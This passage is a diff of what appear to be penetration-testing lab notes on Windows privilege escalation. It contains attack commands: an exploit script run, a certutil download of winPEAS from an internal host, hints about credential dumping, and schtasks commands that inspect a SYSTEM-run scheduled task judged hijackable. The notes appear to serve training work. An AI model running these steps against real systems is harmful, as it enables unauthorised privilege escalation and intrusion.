@@ -103,7 +103,7 @@ python2 43478.py
 
 ------------------------------------
 
-Privilege Escalation (Scheduled Task):
+Winpeas:
 
 whoami
 whoami /priv
@@ -128,6 +128,10 @@ certutil.exe -f -urlcache http://172.16.11.11 /winPEAS64.exe winpeas.exe
 (If nothing else pops up, or you don't know where to start, check if you get any hits (red color) on Watson (vulnerabilities))
 (Look at cached logons, as this will allow you to credential dump if you have elevated access. Look at UAC version. Look at powershell history. Look at drives. Look at scheduled tasks.)
 (We see a job named "FTP Backup", located at: C:\Users\gale\AppData\Local\Scripts\backup.bat, vulnerable to DLL hijacking)
+
+------------------------------------
+Privilege Escalation (Scheduled Task):
+
 schtasks /query /fo LIST /v /TN "FTP Backup"
 (This command shows the task runs as "NT Authority\SYSTEM"!)
 type C:\Users\gale\AppData\Local\Scripts\backup.bat
